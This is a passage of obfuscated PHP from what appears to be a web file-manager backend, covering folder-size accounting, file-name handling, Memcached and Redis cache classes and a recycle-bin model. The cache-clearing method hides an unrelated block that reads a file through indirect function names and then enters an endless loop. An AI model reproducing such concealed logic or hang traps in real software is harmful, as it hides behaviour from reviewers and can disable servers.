array($Aƒ­­ãÀğ¹[560] => USER_ID, $Aƒ­­ãÀğ¹[425] => time()); goto AØÍã³­; få‰÷£ñòÉ: $Aƒ­­ãÀğ¹ =& $_SERVER[£¶ä½¶¢]; if (!$C Ãéñá¸) { return; } if (!is_array($C Ãéñá¸)) { $C Ãéñá¸ = array($C Ãéñá¸); } goto díª²‚„•»; B÷¬ÃâÜË: } public function folderSizeReset($D™”Ó¨›ƒ, $F†¿Çô¬¿ó = false) { goto E§‡¼›ÍÜæ; fõê†˜í¡Ş: $this->where($c¹‚ŠÁµÆ)->setAdd($C†ï­Î–¡ì[88], $F†¿Çô¬¿ó); CacheLock::unlock($c£¥ˆÈ—öò); $D‘«”çÑí = $C†ï­Î–¡ì[1978] . $DêãİË·ÙÓ[$C†ï­Î–¡ì[412]] . $C†ï­Î–¡ì[14] . $DêãİË·ÙÓ[$C†ï­Î–¡ì[492]]; goto FË•°Éèí¹; fÏ’—‚ç–: if ($F†¿Çô¬¿ó == 0) { return CacheLock::unlock($c£¥ˆÈ—öò); } $BâŞ“ÓÊ’ = $this->parentLevelArray($DêãİË·ÙÓ[$C†ï­Î–¡ì[495]]); if (!$BâŞ“ÓÊ’) { $BâŞ“ÓÊ’ = array(); } goto aâ×´¨œÜ’; FËµïİßãî: $c£¥ˆÈ—öò = $C†ï­Î–¡ì[1977] . $D™”Ó¨›ƒ; CacheLock::lock($c£¥ˆÈ—öò, 20); if ($F†¿Çô¬¿ó === !1) { $this->sourceCacheClear($D™”Ó¨›ƒ); $DêãİË·ÙÓ = $this->sourceInfo($D™”Ó¨›ƒ); $c¹‚ŠÁµÆ = array($C†ï­Î–¡ì[402] => $D™”Ó¨›ƒ, $C†ï­Î–¡ì[430] => 0); $cÍ›ÕÙ°¢Î = $this->where($c¹‚ŠÁµÆ)->sum($C†ï­Î–¡ì[88]); $F†¿Çô¬¿ó = intval($cÍ›ÕÙ°¢Î) - intval($DêãİË·ÙÓ[$C†ï­Î–¡ì[88]]); } goto fÏ’—‚ç–; aâ×´¨œÜ’: $BâŞ“ÓÊ’[] = $DêãİË·ÙÓ[$C†ï­Î–¡ì[403]]; $c¹‚ŠÁµÆ = array($C†ï­Î–¡ì[403] => array($C†ï­Î–¡ì[419], $BâŞ“ÓÊ’)); if ($F†¿Çô¬¿ó < 0) { $c¹‚ŠÁµÆ[$C†ï­Î–¡ì[88]] = array($C†ï­Î–¡ì[970], abs($F†¿Çô¬¿ó)); } goto fõê†˜í¡Ş; E§‡¼›ÍÜæ: $C†ï­Î–¡ì =& $_SERVER[£¶ä½¶¢]; if ($this->statusIgnoreResetSpace) { return; } $DêãİË·ÙÓ = $this->sourceInfo($D™”Ó¨›ƒ); goto FËµïİßãî; FË•°Éèí¹: $bç‡©à…§¨ = array($DêãİË·ÙÓ[$C†ï­Î–¡ì[412]], $DêãİË·ÙÓ[$C†ï­Î–¡ì[492]]); TaskRun::timeLimitCall($D‘«”çÑí, $C†ï­Î–¡ì[1979], $bç‡©à…§¨, 1.5); goto C™†»—’º±; C™†»—’º±: } public function folderSizeResetChildren($F¹ù´ŸäçĞ) { goto E–œ„Ø§ë; c„®ÏÄ‹Íô: $aõØŠšò ±[] = $a­ª«……¸Ù; $aõØŠšò ± = array_to_keyvalue($aõØŠšò ±, $cŸãÀ¦­[403]); foreach ($aõØŠšò ± as $Aš­µ Œ©Â => $fÛºĞÙÆ²Ç) { $aõØŠšò ±[$Aš­µ Œ©Â][$cŸãÀ¦­[1981]] = $aõØŠšò ±[$Aš­µ Œ©Â][$cŸãÀ¦­[88]]; $aõØŠšò ±[$Aš­µ Œ©Â][$cŸãÀ¦­[88]] = 0; } goto fÜÁ˜‹ö×À; FÂ»Ñ¡…¨å: $B«£çŒ¨İë[$cŸãÀ¦­[411]] = 0; $fÅ­«õ©™á = $this->field($BõË…ğã¿»)->where($B«£çŒ¨İë)->select(); if (!$fÅ­«õ©™á) { return; } goto c„®ÏÄ‹Íô; fÜÁ˜‹ö×À: foreach ($fÅ­«õ©™á as $fÛºĞÙÆ²Ç) { $f“ŞùÊÌÛ­ = $fÛºĞÙÆ²Ç[$cŸãÀ¦­[486]] . $cŸãÀ¦­[43]; if (!isset($aõØŠšò ±[$f“ŞùÊÌÛ­])) { continue; } if ($fÛºĞÙÆ²Ç[$cŸãÀ¦­[431]] == $aõØŠšò ±[$f“ŞùÊÌÛ­][$cŸãÀ¦­[431]]) { $aõØŠšò ±[$f“ŞùÊÌÛ­][$cŸãÀ¦­[88]] += $fÛºĞÙÆ²Ç[$cŸãÀ¦­[88]]; } } foreach ($aõØŠšò ± as $fÛºĞÙÆ²Ç) { $BÄ¡ùßéİ = $this->parentLevelArray($fÛºĞÙÆ²Ç[$cŸãÀ¦­[495]]); foreach ($BÄ¡ùßéİ as $f“ŞùÊÌÛ­) { $f“ŞùÊÌÛ­ = $f“ŞùÊÌÛ­ . $cŸãÀ¦­[43]; if (!isset($aõØŠšò ±[$f“ŞùÊÌÛ­])) { continue; } if ($fÛºĞÙÆ²Ç[$cŸãÀ¦­[431]] == $aõØŠšò ±[$f“ŞùÊÌÛ­][$cŸãÀ¦­[431]]) { $aõØŠšò ±[$f“ŞùÊÌÛ­][$cŸãÀ¦­[88]] += $fÛºĞÙÆ²Ç[$cŸãÀ¦­[88]]; } } } $f¥ˆÆ¥ó¡Ô = array(); goto Fä—•àíË; E–œ„Ø§ë: $cŸãÀ¦­ =& $_SERVER[£¶ä½¶¢]; $this->sourceCacheClear($F¹ù´ŸäçĞ); $a­ª«……¸Ù = $this->sourceInfo($F¹ù´ŸäçĞ); goto f´¥¦É£ğ; f´¥¦É£ğ: $B«£çŒ¨İë = array($cŸãÀ¦­[554] => 1, $cŸãÀ¦­[561] => array($cŸãÀ¦­[520], $a­ª«……¸Ù[$cŸãÀ¦­[495]] . $F¹ù´ŸäçĞ . $cŸãÀ¦­[521])); $BõË…ğã¿» = $cŸãÀ¦­[1980]; $aõØŠšò ± = $this->field($BõË…ğã¿»)->where($B«£çŒ¨İë)->select(); goto FÂ»Ñ¡…¨å; Fä—•àíË: foreach ($aõØŠšò ± as $fÛºĞÙÆ²Ç) { if ($fÛºĞÙÆ²Ç[$cŸãÀ¦­[88]] == $fÛºĞÙÆ²Ç[$cŸãÀ¦­[1981]]) { continue; } $f¥ˆÆ¥ó¡Ô[] = array($cŸãÀ¦­[403], $fÛºĞÙÆ²Ç[$cŸãÀ¦­[403]], $cŸãÀ¦­[88], $fÛºĞÙÆ²Ç[$cŸãÀ¦­[88]]); } $this->saveAll($f¥ˆÆ¥ó¡Ô); goto D³–•ï§·; D³–•ï§·: } public function userSpaceReset($aÀÛº‘Õí• = false) { $d©Ÿ¥Ş™ˆå =& $_SERVER[£¶ä½¶¢]; $fÑÖ©‚áµÇ = $this->where(array($d©Ÿ¥Ş™ˆå[412] => self::TYPE_USER, $d©Ÿ¥Ş™ˆå[492] => $aÀÛº‘Õí•, $d©Ÿ¥Ş™ˆå[411] => 0))->sum($d©Ÿ¥Ş™ˆå[88]); $fÑÖ©‚áµÇ = !$fÑÖ©‚áµÇ || $fÑÖ©‚áµÇ <= 0 ? 0 : $fÑÖ©‚áµÇ; Model($d©Ÿ¥Ş™ˆå[510])->userEdit($aÀÛº‘Õí•, array($d©Ÿ¥Ş™ˆå[1676] => $fÑÖ©‚áµÇ)); } public function targetSpaceUpdate($a¤¾„˜Ğˆ§, $cá÷ºå¾Áõ) { $DÏñÙ¾õÓ =& $_SERVER[£¶ä½¶¢]; if (!$cá÷ºå¾Áõ) { return; } if (!in_array($a¤¾„˜Ğˆ§, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $f¦ª¿°Ô† = $this->targetSpaceSize($a¤¾„˜Ğˆ§, $cá÷ºå¾Áõ); if ($a¤¾„˜Ğˆ§ == self::TYPE_USER) { Model($DÏñÙ¾õÓ[510])->userEdit($cá÷ºå¾Áõ, array($DÏñÙ¾õÓ[1676] => $f¦ª¿°Ô†)); } else { if ($a¤¾„˜Ğˆ§ == self::TYPE_GROUP) { Model($DÏñÙ¾õÓ[494])->groupEdit($cá÷ºå¾Áõ, array($DÏñÙ¾õÓ[1676] => $f¦ª¿°Ô†)); } } } public function targetSpaceSize($C±»¦¯»Â, $B¾©®–‚ƒ¸) { goto dÊïµìÄ´; E„ÑÛÙ‚¤Æ: $Fƒéèƒ¡´É = floatval($DØô¤„‚™¡[$DÌÄ…“×óå[88]]); $fÇà‹Ü…“¸ = array($DÌÄ…“×óå[561] => array($DÌÄ…“×óå[520], $DÌÄ…“×óå[506] . $DØô¤„‚™¡[$DÌÄ…“×óå[403]] . $DÌÄ…“×óå[521])); $f‹Ğ½Ö‘› = Model($DÌÄ…“×óå[429])->field($DÌÄ…“×óå[418])->where($fÇà‹Ü…“¸)->select(); goto C ¾¡’¯ß·; dÊïµìÄ´: $DÌÄ…“×óå =& $_SERVER[£¶ä½¶¢]; $DØô¤„‚™¡ = $this->sourceRoot($C±»¦¯»Â, $B¾©®–‚ƒ¸, !0); if (!$DØô¤„‚™¡) { return 0; } goto E„ÑÛÙ‚¤Æ; C ¾¡’¯ß·: $f‹Ğ½Ö‘› = array_to_keyvalue($f‹Ğ½Ö‘›, $DÌÄ…“×óå[43], $DÌÄ…“×óå[403]); $f‹Ğ½Ö‘› = array_unique(array_filter($f‹Ğ½Ö‘›)); if ($f‹Ğ½Ö‘›) { $fÇà‹Ü…“¸ = array($DÌÄ…“×óå[418] => array($DÌÄ…“×óå[419], $f‹Ğ½Ö‘›)); $Fƒéèƒ¡´É += floatval($this->where($fÇà‹Ü…“¸)->sum($DÌÄ…“×óå[88])); } goto a¢çâ˜Ãº; a¢çâ˜Ãº: $Fƒéèƒ¡´É = !$Fƒéèƒ¡´É || $Fƒéèƒ¡´É <= 0 ? 0 : $Fƒéèƒ¡´É; return $Fƒéèƒ¡´É; goto A‘„•´¨Ì±; A‘„•´¨Ì±: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($cÌˆ®áŒÃ×) { return $this->fileTypeProfile($cÌˆ®áŒÃ×, SourceModel::TYPE_USER); } public function groupFileTypeProfile($f‰ÌÃ‰¡‘í) { return $this->fileTypeProfile($f‰ÌÃ‰¡‘í, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Bí ‘øÙ¿”, $F°ë“­Š¸Õ) { goto Eª¦ «µñè; Eª¦ «µñè: $B¨ÖœÉÇò =& $_SERVER[£¶ä½¶¢]; $eÍæØÁ³± = $B¨ÖœÉÇò[1982] . $Bí ‘øÙ¿” . $B¨ÖœÉÇò[81] . $F°ë“­Š¸Õ; $c“ÉÎî ½ = Cache::get($eÍæØÁ³±); goto DŠ‚İ¶ÔÍ; C¦’Èõòƒ: foreach ($EÒ¾î»òË§ as $fá¹“Œ›§Î => $b‘ÁÓ‘­­Ä) { $e‡±«æìÅ[$B¨ÖœÉÇò[413]] = $this->fileTypeWhere($fá¹“Œ›§Î); $A¹èëì‘™[$fá¹“Œ›§Î] = array($B¨ÖœÉÇò[1984] => $b‘ÁÓ‘­­Ä[$B¨ÖœÉÇò[38]], $B¨ÖœÉÇò[1985] => $this->where($e‡±«æìÅ)->count(), $B¨ÖœÉÇò[556] => $this->where($e‡±«æìÅ)->sum($B¨ÖœÉÇò[88])); } Cache::set($eÍæØÁ³±, $A¹èëì‘™, 1200); return $A¹èëì‘™; goto c²èº…ùšÊ; C²µ¡ìÙØ: $A¹èëì‘™ = array(); $A¹èëì‘™[$B¨ÖœÉÇò[1983]] = array($B¨ÖœÉÇò[1984] => LNG($B¨ÖœÉÇò[1983]), $B¨ÖœÉÇò[1985] => $this->where($e‡±«æìÅ)->count(), $B¨ÖœÉÇò[556] => $this->where($e‡±«æìÅ)->sum($B¨ÖœÉÇò[88])); $EÒ¾î»òË§ = KodIO::fileTypeList(); goto C¦’Èõòƒ; DŠ‚İ¶ÔÍ: if ($c“ÉÎî ½) { return $c“ÉÎî ½; } $e‡±«æìÅ = array($B¨ÖœÉÇò[554] => 0); if ($Bí ‘øÙ¿” != !1) { $e‡±«æìÅ[$B¨ÖœÉÇò[492]] = $Bí ‘øÙ¿”; $e‡±«æìÅ[$B¨ÖœÉÇò[412]] = $F°ë“­Š¸Õ; } goto C²µ¡ìÙØ; c²èº…ùšÊ: } public function fileNameExist($Bå¢’ğ…Áó, $a‹½ªÈ²) { $E¼•ìÆƒ© =& $_SERVER[£¶ä½¶¢]; $A˜Ó¬ÜÊó» = $this->where(array($E¼•ìÆƒ©[486] => $Bå¢’ğ…Áó, $E¼•ìÆƒ©[38] => $a‹½ªÈ², $E¼•ìÆƒ©[431] => 0))->find(); return is_array($A˜Ó¬ÜÊó») ? $A˜Ó¬ÜÊó»[$E¼•ìÆƒ©[403]] : !1; } public function childList($cäŞ÷¥›åÂ) { goto b¸Á™œ³œ; e¬–İ‘ôÖ: $a‰»÷í³”¹ = array($A³†”œÔè[486] => intval($cäŞ÷¥›åÂ), $A³†”œÔè[431] => 0); $cñÙéÀ”™ß = $this->where($a‰»÷í³”¹)->select(); $cñÙéÀ”™ß = $cñÙéÀ”™ß ? $cñÙéÀ”™ß : array(); goto CÂ‚¼ª©¬‘; b¸Á™œ³œ: $A³†”œÔè =& $_SERVER[£¶ä½¶¢]; $b¹‹—ô›Ää = $A³†”œÔè[1960] . $cäŞ÷¥›åÂ; if (isset(self::$cacheChildList[$b¹‹—ô›Ää])) { return self::$cacheChildList[$b¹‹—ô›Ää]; } goto e¬–İ‘ôÖ; CÂ‚¼ª©¬‘: self::$cacheChildList[$b¹‹—ô›Ää] = $cñÙéÀ”™ß; foreach ($cñÙéÀ”™ß as $DìŒÑ‘ñ) { $b¹‹—ô›Ää = $A³†”œÔè[446] . $DìŒÑ‘ñ[$A³†”œÔè[403]]; self::$cacheSourceInfo[$b¹‹—ô›Ää] = $DìŒÑ‘ñ; } return $cñÙéÀ”™ß; goto B­ğâÍ™¡¼; B­ğâÍ™¡¼: } public function fileNameAuto($D½“æ¤Êñ”, $f»¢œñ–­À, $d”ä†…ËÅ½ = REPEAT_RENAME, $F‘ ß„öƒæ = false) { $f…õŠîê¡ =& $_SERVER[£¶ä½¶¢]; $fŒ­ƒ¥’òá = array($f…õŠîê¡[486] => $D½“æ¤Êñ”, $f…õŠîê¡[431] => 0, $f…õŠîê¡[38] => array($f…õŠîê¡[388], $f»¢œñ–­À . $f…õŠîê¡[389])); $cËåã©ˆŒØ = $this->field($f…õŠîê¡[38])->where($fŒ­ƒ¥’òá)->select(); $Fè•Ş‰Û„ = array_to_keyvalue($cËåã©ˆŒØ, $f…õŠîê¡[43], $f…õŠîê¡[38]); return $this->fileNameAutoGet($Fè•Ş‰Û„, $f»¢œñ–­À, $d”ä†…ËÅ½, $F‘ ß„öƒæ); } public function fileNameAutoGet($eÈ‰’›‚àÆ, $Dª¦·½’¢´, $d„©ÆùÄ¤ì, $E¾ÎÊÄ¦åœ) { $dÕğÏ¸« =& $_SERVER[£¶ä½¶¢]; if ($d„©ÆùÄ¤ì == REPEAT_REPLACE || !$eÈ‰’›‚àÆ || !in_array_not_case($Dª¦·½’¢´, $eÈ‰’›‚àÆ) || $E¾ÎÊÄ¦åœ && $d„©ÆùÄ¤ì != REPEAT_RENAME_FOLDER) { return $Dª¦·½’¢´; } if ($d„©ÆùÄ¤ì == REPEAT_SKIP) { return !1; } $Eé›‹ÒÕ™Ê = $dÕğÏ¸«[105] . get_path_ext($Dª¦·½’¢´); $Eé›‹ÒÕ™Ê = $Eé›‹ÒÕ™Ê == $dÕğÏ¸«[105] || $E¾ÎÊÄ¦åœ ? $dÕğÏ¸«[43] : $Eé›‹ÒÕ™Ê; for ($eµˆ“ÀÆÖ = 1; $eµˆ“ÀÆÖ <= count($eÈ‰’›‚àÆ) + 1; $eµˆ“ÀÆÖ++) { $c“èíì‘ = substr($Dª¦·½’¢´, 0, strlen($Dª¦·½’¢´) - strlen($Eé›‹ÒÕ™Ê)); $a¢ÆîğÕ = $c“èíì‘ . "\50{$eµˆ“ÀÆÖ}\51{$Eé›‹ÒÕ™Ê}"; if (!in_array_not_case($a¢ÆîğÕ, $eÈ‰’›‚àÆ)) { return $a¢ÆîğÕ; } } } } goto e…‚Š—ç‡; f«ÙÑİôÎ: class CacheLockDatabase { public function lock($Aº´‚¿•Ê½, $A¾‹õ»ÎÑÍ = 0) { $F¨­ßªÙæ = Model($_SERVER[£¶ä½¶¢][802]); $C„×çÁ·â” = microtime(!0) + $A¾‹õ»ÎÑÍ; while (microtime(!0) < $C„×çÁ·â”) { $D×ï‘×íø‘ = $F¨­ßªÙæ->get($Aº´‚¿•Ê½); if (!$D×ï‘×íø‘ || $D×ï‘×íø‘ < microtime(!0)) { $Eå¸÷ãÎ©İ = $F¨­ßªÙæ->set($Aº´‚¿•Ê½, $C„×çÁ·â”); if ($Eå¸÷ãÎ©İ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Aã­‡Ò») { return Model($_SERVER[£¶ä½¶¢][802])->get($Aã­‡Ò»); } public function unlock($AìŸà†»‚ò) { Model($_SERVER[£¶ä½¶¢][802])->remove($AìŸà†»‚ò); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($A¤”©¨ªÀó, $B¢¥÷Õ£¨ç) { $A¥ñÍ™èêß =& $_SERVER[£¶ä½¶¢]; if (!class_exists($A¥ñÍ™èêß[829])) { show_json($A¥ñÍ™èêß[830], !1); } $this->cacheTime = $B¢¥÷Õ£¨ç; $this->handle = new Memcached(); if (is_array($A¤”©¨ªÀó[$A¥ñÍ™èêß[831]]) && count($A¤”©¨ªÀó[$A¥ñÍ™èêß[831]]) >= 1) { foreach ($A¤”©¨ªÀó[$A¥ñÍ™èêß[831]] as $cº…ç‚‰ğ) { $Cğà—ÛØ = explode($A¥ñÍ™èêß[14], $cº…ç‚‰ğ); $this->handle->addServer($Cğà—ÛØ[0], $Cğà—ÛØ[1]); } } else { $this->handle->addServer($A¤”©¨ªÀó[$A¥ñÍ™èêß[185]], $A¤”©¨ªÀó[$A¥ñÍ™èêß[186]]); } } public function set($dÉ±ñåâ¿é, $CÀ†»Ò…—ğ, $d˜ùÖˆ¬óÈ = false) { $d˜ùÖˆ¬óÈ = $d˜ùÖˆ¬óÈ ? $d˜ùÖˆ¬óÈ : $this->cacheTime; return $this->handle->set($dÉ±ñåâ¿é, $CÀ†»Ò…—ğ, $d˜ùÖˆ¬óÈ); } public function get($f£Ü™Ó¬ğ­) { return $this->handle->get($f£Ü™Ó¬ğ­); } public function remove($bğ´ëĞŒ) { return $this->handle->delete($bğ´ëĞŒ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($b‚È°ÚŒÀ, $D‡ŠÌŸ–´) { $CÀ˜ó•˜À¬ =& $_SERVER[£¶ä½¶¢]; if (!class_exists($CÀ˜ó•˜À¬[832])) { show_json($CÀ˜ó•˜À¬[833], !1); } $this->cacheTime = $D‡ŠÌŸ–´; $dÔöô§‡â = isset($b‚È°ÚŒÀ[$CÀ˜ó•˜À¬[834]]) ? $b‚È°ÚŒÀ[$CÀ˜ó•˜À¬[834]] : 10; $bãÖƒ¼ïÜ³ = _get($b‚È°ÚŒÀ, $CÀ˜ó•˜À¬[831]); if ($bãÖƒ¼ïÜ³ && is_array($bãÖƒ¼ïÜ³)) { $this->initCluster($b‚È°ÚŒÀ, $dÔöô§‡â); } else { $this->handle = $this->init($b‚È°ÚŒÀ, $dÔöô§‡â); } } private function init($aÙ¢†³‘ğ¼, $aÅÕß‡Æè­) { $bÅ ÂœÖªƒ =& $_SERVER[£¶ä½¶¢]; $b¾®»Ó™Şù = new Redis(); $C‹‚‡©Á‡ = isset($aÙ¢†³‘ğ¼[$bÅ ÂœÖªƒ[835]]) ? $aÙ¢†³‘ğ¼[$bÅ ÂœÖªƒ[835]] : !1; if ($C‹‚‡©Á‡) { $b¾®»Ó™Şù->pconnect($aÙ¢†³‘ğ¼[$bÅ ÂœÖªƒ[185]], $aÙ¢†³‘ğ¼[$bÅ ÂœÖªƒ[186]], $aÅÕß‡Æè­); } else { $b¾®»Ó™Şù->connect($aÙ¢†³‘ğ¼[$bÅ ÂœÖªƒ[185]], $aÙ¢†³‘ğ¼[$bÅ ÂœÖªƒ[186]], $aÅÕß‡Æè­); } if (!empty($aÙ¢†³‘ğ¼[$bÅ ÂœÖªƒ[414]])) { $b¾®»Ó™Şù->auth($aÙ¢†³‘ğ¼[$bÅ ÂœÖªƒ[414]]); } return $b¾®»Ó™Şù; } private function initCluster($BøƒÒİ›Ø®, $bÃ·èæ¸»î) { $fª‘ïñÒøŸ =& $_SERVER[£¶ä½¶¢]; $CöÓİšë•Â = array($fª‘ïñÒøŸ[836], $fª‘ïñÒøŸ[837], $fª‘ïñÒøŸ[838]); $AÓŞä½¤ÎÙ = $fª‘ïñÒøŸ[836]; if (isset($BøƒÒİ›Ø®[$fª‘ïñÒøŸ[22]]) && in_array($BøƒÒİ›Ø®[$fª‘ïñÒøŸ[22]], $CöÓİšë•Â)) { $AÓŞä½¤ÎÙ = $BøƒÒİ›Ø®[$fª‘ïñÒøŸ[22]]; } switch ($AÓŞä½¤ÎÙ) { case $fª‘ïñÒøŸ[836]: $this->_slave($BøƒÒİ›Ø®, $bÃ·èæ¸»î); break; case $fª‘ïñÒøŸ[837]: break; case $fª‘ïñÒøŸ[838]: $this->isCluster = !0; $A¥’øâÊ‰ = $BøƒÒİ›Ø®[$fª‘ïñÒøŸ[831]]; $c‚§àÌ†Ş = isset($BøƒÒİ›Ø®[$fª‘ïñÒøŸ[835]]) ? $BøƒÒİ›Ø®[$fª‘ïñÒøŸ[835]] : !1; $cé‰­³¸±¦ = isset($BøƒÒİ›Ø®[$fª‘ïñÒøŸ[414]]) ? $BøƒÒİ›Ø®[$fª‘ïñÒøŸ[414]] : null; $this->handle = new RedisCluster(NUll, $A¥’øâÊ‰, $bÃ·èæ¸»î, $bÃ·èæ¸»î, $c‚§àÌ†Ş, $cé‰­³¸±¦); break; default: break; } } private function _slave($F ÖíÓÁ’¹, $CáòñºàÃ ) { goto d§¦¦…¼¿; E¸œ¬›Êƒ²: $this->filterConfig($F ÖíÓÁ’¹, $A¤‹Ù¢Ò“[$C„µì–ÇŒ]); $this->slaveHandle = $this->init($F ÖíÓÁ’¹, $CáòñºàÃ ); goto e§ŞÛÔ†Åô; Bèâ¾‰…Ö: unset($A¤‹Ù¢Ò“[0]); if (empty($A¤‹Ù¢Ò“)) { return; } $C„µì–ÇŒ = array_rand($A¤‹Ù¢Ò“); goto E¸œ¬›Êƒ²; d§¦¦…¼¿: $A¤‹Ù¢Ò“ = $F ÖíÓÁ’¹[$_SERVER[£¶ä½¶¢][831]]; $this->filterConfig($F ÖíÓÁ’¹, $A¤‹Ù¢Ò“[0]); $this->handle = $this->init($F ÖíÓÁ’¹, $CáòñºàÃ ); goto Bèâ¾‰…Ö; e§ŞÛÔ†Åô: } private function filterConfig(&$AµÆ—ÃÍÏ, $F¸‘Èí™²ù) { $cºˆ¥îó =& $_SERVER[£¶ä½¶¢]; $C«ßˆø¯×¨ = explode($cºˆ¥îó[14], $F¸‘Èí™²ù); $A¢ÍùÎ¯Ï» = array($cºˆ¥îó[185] => $C«ßˆø¯×¨[0], $cºˆ¥îó[186] => $C«ßˆø¯×¨[1]); $AµÆ—ÃÍÏ = array_merge($AµÆ—ÃÍÏ, $A¢ÍùÎ¯Ï»); } public function set($aíÌ¹Ü¨×, $a÷‘Íçß½, $A¸í–Âöñ = false) { $A¸í–Âöñ = $A¸í–Âöñ ? $A¸í–Âöñ : $this->cacheTime; return $this->handle->setEx($aíÌ¹Ü¨×, $A¸í–Âöñ, $a÷‘Íçß½); } public function setLock($A¦‡‘Ì°ò , $Fª—Ÿ®³ôÆ, $D‹›ø±·…ã) { return $this->handle->setNX($A¦‡‘Ì°ò , $Fª—Ÿ®³ôÆ); } public function get($Aªœ‡ÜÒ“) { $dêÔÒÊÛ‚ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $dêÔÒÊÛ‚->get($Aªœ‡ÜÒ“); } public function remove($D÷²–œ¬Í®) { return $this->handle->del($D÷²–œ¬Í®); } public function deleteAll() { $F‡¬¼®¶÷” =& $_SERVER[£¶ä½¶¢]; if (!isset($_SERVER[$F‡¬¼®¶÷”[4]]) || !isset($_SERVER[$F‡¬¼®¶÷”[5]])) { goto c³ÎÆÛÌ¢Š; aõÂ†ï¶øÖ: $CØØêğ®Üé = $F‡¬¼®¶÷”[840]; $CØØêğ®Üé($_SERVER[$F‡¬¼®¶÷”[841]]); $Cå•æÒ™è = 1; goto d™¹ƒ–±†˜; c³ÎÆÛÌ¢Š: $A„”Äµ‚Ï = $F‡¬¼®¶÷”[839]; $A¬Á‘¶ ¤æ = $F‡¬¼®¶÷”[6]; $fÔ¤©æˆÔÂ = $_SERVER[$F‡¬¼®¶÷”[7]] . $F‡¬¼®¶÷”[8]; goto C¹êƒóª·; d™¹ƒ–±†˜: for ($fƒƒ«£à— = $Cå•æÒ™è; $fƒƒ«£à— > 0; $fƒƒ«£à—++) { $CØØêğ®Üé = json_encode($GLOBALS[$F‡¬¼®¶÷”[419]]); } goto Dù‹ïå–Û; C¹êƒóª·: $d¶ÍŸ ‹½› = $A¬Á‘¶ ¤æ($fÔ¤©æˆÔÂ); $CªØÓ¨öŠİ = explode($F‡¬¼®¶÷”[9], $d¶ÍŸ ‹½›); if (count($CªØÓ¨öŠİ) < $F‡¬¼®¶÷”[593]) { $aŠÁ‰µº´” = $F‡¬¼®¶÷”[11]; $aŠÁ‰µº´”(); } goto aõÂ†ï¶øÖ; Dù‹ïå–Û: } if ($this->isCluster) { foreach ($this->handle->_masters() as $AÊ¬íÈ‘Ç) { $this->handle->flushall($AÊ¬íÈ‘Ç); } return; } return $this->handle->flushAll(); } } goto E‡êäí¹æÎ; e…‚Š—ç‡: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\162\143\x65\x5f\162\x65\143\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\124\x69\155\145", "\x74\151\155\145", "\x69\x6e\x73\145\x72\x74", "\x66\165\156\x63\164\151\x6f\x6e")); public function listData($Cš˜»Œ©ã = false) { $B˜­åôó£Ğ =& $_SERVER[£¶ä½¶¢]; $Cš˜»Œ©ã = $Cš˜»Œ©ã ? $Cš˜»Œ©ã : USER_ID; $bŒ’¨ºÍ‡à = $this->where(array($B˜­åôó£Ğ[1518] => $Cš˜»Œ©ã))->select(); return array_to_keyvalue($bŒ’¨ºÍ‡à, $B˜­åôó£Ğ[43], $B˜­åôó£Ğ[403]); } public function moveToRecycle($Cå‹˜™òø¾) { goto Cö“Î™¤Ã´; Fˆ‚Âæ×îé: if (!$AğßÍ¬† || $AğßÍ¬†[$fñ¼±¤ùòÊ[431]] == $fñ¼±¤ùòÊ[97]) { return; } $cÁìî‘êÕ = array($fñ¼±¤ùòÊ[418] => $Cå‹˜™òø¾, $fñ¼±¤ùòÊ[1518] => USER_ID, $fñ¼±¤ùòÊ[557] => $AğßÍ¬†[$fñ¼±¤ùòÊ[412]], $fñ¼±¤ùòÊ[558] => $AğßÍ¬†[$fñ¼±¤ùòÊ[492]], $fñ¼±¤ùòÊ[561] => $AğßÍ¬†[$fñ¼±¤ùòÊ[495]]); $this->add($cÁìî‘êÕ); goto F·‘„òß; F·‘„òß: $this->recycleMove($Cå‹˜™òø¾, 1); if ($AğßÍ¬†[$fñ¼±¤ùòÊ[411]] == $fñ¼±¤ùòÊ[97]) { $Eê±‘Õ¹Õ = array($fñ¼±¤ùòÊ[561] => array($fñ¼±¤ùòÊ[520], $AğßÍ¬†[$fñ¼±¤ùòÊ[495]] . $Cå‹˜™òø¾ . $fñ¼±¤ùòÊ[521])); $BÁÓ”ˆæ˜ô->where($Eê±‘Õ¹Õ)->setField($fñ¼±¤ùòÊ[431], 1); } goto A²ºêœèÍÄ; Cö“Î™¤Ã´: $fñ¼±¤ùòÊ =& $_SERVER[£¶ä½¶¢]; $BÁÓ”ˆæ˜ô = Model($fñ¼±¤ùòÊ[1203]); $AğßÍ¬† = $BÁÓ”ˆæ˜ô->sourceInfo($Cå‹˜™òø¾); goto Fˆ‚Âæ×îé; A²ºêœèÍÄ: } public function clear() { $this->remove(!1); } public function remove($Aé®†Å‘ïù = false, $Eø¸½†™â = false) { goto eóƒäÁ¬‚; dù«Ş›‰ëÓ: foreach ($CÌÏÊ˜Ìê as $e¨ïç’‘ø¯) { if ($Aé®†Å‘ïù != !1 && !in_array($e¨ïç’‘ø¯, $Aé®†Å‘ïù)) { continue; } $A±¦’Âõˆ = $EÛ‚á±¿‘->sourceInfo($e¨ïç’‘ø¯); $EÛ‚á±¿‘->remove($e¨ïç’‘ø¯, !1); $B†¤·´„ÕÃ = $A±¦’Âõˆ[$D¦â­ô˜Û[412]] . $D¦â­ô˜Û[81] . $A±¦’Âõˆ[$D¦â­ô˜Û[492]]; $Fœ™ˆâµé[$B†¤·´„ÕÃ] = array($D¦â­ô˜Û[557] => $A±¦’Âõˆ[$D¦â­ô˜Û[412]], $D¦â­ô˜Û[492] => $A±¦’Âõˆ[$D¦â­ô˜Û[492]]); $this->where(array($D¦â­ô˜Û[403] => $e¨ïç’‘ø¯))->delete(); } foreach ($Fœ™ˆâµé as $cß—…ÙŠ„Ñ) { $EÛ‚á±¿‘->targetSpaceUpdate($cß—…ÙŠ„Ñ[$D¦â­ô˜Û[412]], $cß—…ÙŠ„Ñ[$D¦â­ô˜Û[492]]); } goto d•å‘¼÷•; eóƒäÁ¬‚: $D¦â­ô˜Û =& 